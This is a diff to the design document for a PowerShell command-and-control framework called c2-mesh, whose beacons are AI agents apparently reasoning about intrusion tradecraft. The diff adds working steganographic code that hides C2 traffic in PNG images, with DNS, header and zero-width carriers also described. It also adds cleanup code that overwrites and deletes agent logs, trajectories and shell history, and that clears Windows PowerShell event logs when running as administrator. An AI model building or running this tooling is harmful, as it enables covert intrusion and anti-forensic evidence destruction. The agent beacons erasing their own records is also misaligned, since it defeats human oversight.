@@ -86,7 +86,7 @@
 | Operator commands | `New-Tool` (×5) | list_beacons, task_beacon, get_results, deploy_beacon, kill_beacon |
 | Beacon AI brain | `New-Agent` + `Invoke-Agent` | Executes tasks from controller |
 | Beacon tools | PshAgent built-ins + `port_scan` | `run_command`, `read_file`, `write_file`, `list_directory`, `search_files`, `grep` — Claude reasons about tradecraft |
-| Beacon hooks | `New-Hook` (×4) | telemetry, check-in, kill switch, stealth |
+| Beacon hooks | `New-Hook` (×5) | telemetry, check-in, kill switch, stealth, cleanup |
 | Beacon stop | `StopCondition` | Kill switch or max-steps |
 | Sub-agents | `New-SubAgentTool` | For complex multi-step beacon tasks |
 | Mesh relay | `New-Tool` wrapping HTTP forwarding | Beacon-to-beacon relay |
@@ -115,7 +115,10 @@ c2-mesh/
 ├── Config/
 │   └── c2-config.ps1               # Constants, defaults, paths
 ├── Crypto/
-│   └── Invoke-C2Crypto.ps1         # AES-256-GCM encrypt/decrypt
+│   ├── Invoke-C2Crypto.ps1         # AES-256-GCM encrypt/decrypt
+│   └── Invoke-C2Stego.ps1          # Stego transport (PNG LSB embed/extract)
+├── Cleanup/
+│   └── Invoke-BeaconCleanup.ps1    # Forensic artifact wipe (sessions, JSONL, logs, history)
 ├── Controller/
 │   ├── Start-C2Listener.ps1        # HttpListener in background runspace
 │   ├── Get-BeaconRegistry.ps1      # ConcurrentDictionary management
@@ -126,7 +129,7 @@ c2-mesh/
 ├── Beacon/
 │   ├── Register-Beacon.ps1         # POST /register on startup
 │   ├── Invoke-CheckIn.ps1          # POST /checkin (poll for tasks)
-│   ├── New-BeaconHooks.ps1         # 4 hooks (telemetry, checkin, kill, stealth)
+│   ├── New-BeaconHooks.ps1         # 5 hooks (telemetry, checkin, kill, stealth, cleanup)
 │   ├── New-PortScanTool.ps1        # port_scan (only custom tool — rest are PshAgent built-ins)
 │   └── Start-C2Beacon.ps1          # Compose & launch beacon polling loop
 ├── Mesh/
@@ -300,7 +303,97 @@ function New-C2Key {
 }
 ```
 
-### 3.3 `c2-mesh.psd1`
+### 3.3 Steganographic Transport (optional)
+
+Instead of sending AES-256-GCM blobs over HTTPS (which look like encrypted traffic to network
+sensors), payloads can be embedded in benign-looking carriers. Inspired by `dn.transforms`
+from the dreadnode SDK — encoding, image, and zero-width transforms that hide data in plain sight.
+
+**Transport options (beacon ↔ controller):**
+
+| Carrier | Technique | Looks like |
+|---|---|---|
+| PNG images | LSB stego — encrypt payload, spread bits across least-significant bits of pixel channels | Image upload/download (imgur, S3, etc.) |
+| DNS TXT | Split encrypted payload into base32-encoded DNS TXT queries to a controlled domain | Normal DNS lookups |
+| HTTP headers | Spread payload across multiple cookie/header values, base64 chunks | Regular web traffic |
+| Zero-width Unicode | `dn.transforms.encoding.zero_width_encode` — hide payload in invisible chars within normal text | Blog comments, paste sites |
+
+**PNG LSB implementation sketch:**
+
+```powershell
+function Invoke-StegoEmbed {
+    param(
+        [byte[]]$Payload,
+        [string]$CarrierImagePath,
+        [string]$OutputPath
+    )
+
+    $img = [System.Drawing.Bitmap]::new($CarrierImagePath)
+    $capacity = [int]([math]::Floor($img.Width * $img.Height * 3 / 8))
+    if ($Payload.Length -gt $capacity) { throw "Payload too large for carrier ($($Payload.Length) > $capacity bytes)" }
+
+    # Prepend 4-byte length header
+    $lenBytes = [BitConverter]::GetBytes([int]$Payload.Length)
+    $data = $lenBytes + $Payload
+    $bits = [System.Collections.BitArray]::new($data)
+
+    $bitIdx = 0
+    for ($y = 0; $y -lt $img.Height -and $bitIdx -lt $bits.Count; $y++) {
+        for ($x = 0; $x -lt $img.Width -and $bitIdx -lt $bits.Count; $x++) {
+            $px = $img.GetPixel($x, $y)
+            $r = ($px.R -band 0xFE) -bor [int]$bits[$bitIdx++]
+            $g = if ($bitIdx -lt $bits.Count) { ($px.G -band 0xFE) -bor [int]$bits[$bitIdx++] } else { $px.G }
+            $b = if ($bitIdx -lt $bits.Count) { ($px.B -band 0xFE) -bor [int]$bits[$bitIdx++] } else { $px.B }
+            $img.SetPixel($x, $y, [System.Drawing.Color]::FromArgb($px.A, $r, $g, $b))
+        }
+    }
+
+    $img.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
+    $img.Dispose()
+}
+
+function Invoke-StegoExtract {
+    param([string]$ImagePath)
+
+    $img = [System.Drawing.Bitmap]::new($ImagePath)
+    $bits = [System.Collections.Generic.List[bool]]::new()
+
+    for ($y = 0; $y -lt $img.Height; $y++) {
+        for ($x = 0; $x -lt $img.Width; $x++) {
+            $px = $img.GetPixel($x, $y)
+            $bits.Add([bool]($px.R -band 1))
+            $bits.Add([bool]($px.G -band 1))
+            $bits.Add([bool]($px.B -band 1))
+        }
+    }
+    $img.Dispose()
+
+    # Read 4-byte length header
+    $ba = [System.Collections.BitArray]::new($bits.GetRange(0, 32).ToArray())
+    $lenBytes = [byte[]]::new(4)
+    $ba.CopyTo($lenBytes, 0)
+    $payloadLen = [BitConverter]::ToInt32($lenBytes, 0)
+
+    # Read payload
+    $pba = [System.Collections.BitArray]::new($bits.GetRange(32, $payloadLen * 8).ToArray())
+    $payload = [byte[]]::new($payloadLen)
+    $pba.CopyTo($payload, 0)
+    return $payload
+}
+```
+
+The flow: encrypt with AES-256-GCM as normal → embed ciphertext in a PNG via LSB → upload to
+an image host or serve from controller as a static image endpoint. Beacon downloads the image,
+extracts the payload, decrypts. To network sensors, it's just fetching images.
+
+Which transport to use is configurable in `c2-config.ps1`:
+
+```powershell
+# in $script:C2Config
+Transport = 'direct'   # 'direct' (raw HTTPS), 'stego-png', 'stego-dns', 'stego-header'
+```
+
+### 3.4 `c2-mesh.psd1`
 
 ```powershell
 @{
@@ -1149,13 +1242,13 @@ function Invoke-CheckIn {
 
 ### 5.3 `Beacon/New-BeaconHooks.ps1`
 
-Four hooks for the beacon agent:
+Five hooks for the beacon agent:
 
 ```powershell
 function New-BeaconHooks {
     <#
     .SYNOPSIS
-    Create the 4 beacon hooks. Returns PshAgentHook[] array.
+    Create the 5 beacon hooks. Returns PshAgentHook[] array.
     .PARAMETER ControllerUrl
     Controller base URL (for check-in hook)
     .PARAMETER Key
@@ -1246,7 +1339,100 @@ function New-BeaconHooks {
             return $null
         }.GetNewClosure()
 
-    return @($telemetryHook, $checkInHook, $killSwitchHook, $stealthHook)
+    # 5. Cleanup hook — wipe forensic artifacts on agent end
+    $cleanupHook = New-Hook -Name 'beacon_cleanup' `
+        -EventType ([AgentEventType]::AgentEnd) `
+        -Fn {
+            param($event)
+            # Remove PshAgent session files (conversation JSONL, trajectories)
+            $sessionDir = Join-Path ([System.Environment]::GetFolderPath('UserProfile')) '.psh-agent' 'sessions'
+            if (Test-Path $sessionDir) {
+                Get-ChildItem $sessionDir -Filter '*.json' -ErrorAction SilentlyContinue |
+                    ForEach-Object { [System.IO.File]::WriteAllBytes($_.FullName, [byte[]]::new($_.Length)); Remove-Item $_.FullName -Force }
+            }
+
+            # Remove any .jsonl trajectory/log files
+            $logDir = Join-Path ([System.Environment]::GetFolderPath('UserProfile')) '.psh-agent'
+            Get-ChildItem $logDir -Filter '*.jsonl' -Recurse -ErrorAction SilentlyContinue |
+                ForEach-Object { [System.IO.File]::WriteAllBytes($_.FullName, [byte[]]::new($_.Length)); Remove-Item $_.FullName -Force }
+
+            # Remove c2-mesh session/log artifacts
+            $c2Dir = Join-Path ([System.Environment]::GetFolderPath('UserProfile')) '.c2-mesh'
+            if (Test-Path $c2Dir) {
+                Get-ChildItem $c2Dir -Recurse -File -ErrorAction SilentlyContinue |
+                    ForEach-Object { [System.IO.File]::WriteAllBytes($_.FullName, [byte[]]::new($_.Length)); Remove-Item $_.FullName -Force }
+            }
+
+            # Clear PowerShell history for this session
+            $histPath = (Get-PSReadLineOption).HistorySavePath
+            if ($histPath -and (Test-Path $histPath)) {
+                Clear-Content $histPath -Force -ErrorAction SilentlyContinue
+            }
+
+            return $null
+        }.GetNewClosure()
+
+    return @($telemetryHook, $checkInHook, $killSwitchHook, $stealthHook, $cleanupHook)
+}
+```
+
+The cleanup hook fires on every `AgentEnd` event (after each task completes). It overwrites files
+with zeros before deleting (not just `Remove-Item`, which leaves data recoverable). Targets:
+
+- `~/.psh-agent/sessions/*.json` — PshAgent conversation logs
+- `~/.psh-agent/**/*.jsonl` — trajectory/event logs
+- `~/.c2-mesh/` — C2-specific session and log files
+- PowerShell readline history — command history from the beacon process
+
+For a full wipe on beacon termination (not just per-task), `Start-C2Beacon` calls a standalone
+cleanup in its `finally` block:
+
+```powershell
+function Invoke-BeaconCleanup {
+    <#
+    .SYNOPSIS
+    Wipe all forensic artifacts left by the beacon process.
+    Overwrites file contents before deletion. Clears event logs if admin.
+    #>
+    [CmdletBinding()]
+    param()
+
+    $paths = @(
+        (Join-Path ([System.Environment]::GetFolderPath('UserProfile')) '.psh-agent'),
+        (Join-Path ([System.Environment]::GetFolderPath('UserProfile')) '.c2-mesh')
+    )
+
+    foreach ($dir in $paths) {
+        if (Test-Path $dir) {
+            Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+                # Overwrite with random bytes, then delete
+                $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+                $junk = [byte[]]::new($_.Length)
+                $rng.GetBytes($junk)
+                [System.IO.File]::WriteAllBytes($_.FullName, $junk)
+                $rng.Dispose()
+                Remove-Item $_.FullName -Force
+            }
+            Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    # Clear PS history
+    $histPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
+    if ($histPath -and (Test-Path $histPath)) {
+        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+        $junk = [byte[]]::new((Get-Item $histPath).Length)
+        $rng.GetBytes($junk)
+        [System.IO.File]::WriteAllBytes($histPath, $junk)
+        $rng.Dispose()
+        Remove-Item $histPath -Force
+    }
+
+    # Clear PowerShell event logs if running elevated
+    if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        wevtutil cl 'Microsoft-Windows-PowerShell/Operational' 2>$null
+        wevtutil cl 'Windows PowerShell' 2>$null
+    }
 }
 ```
 
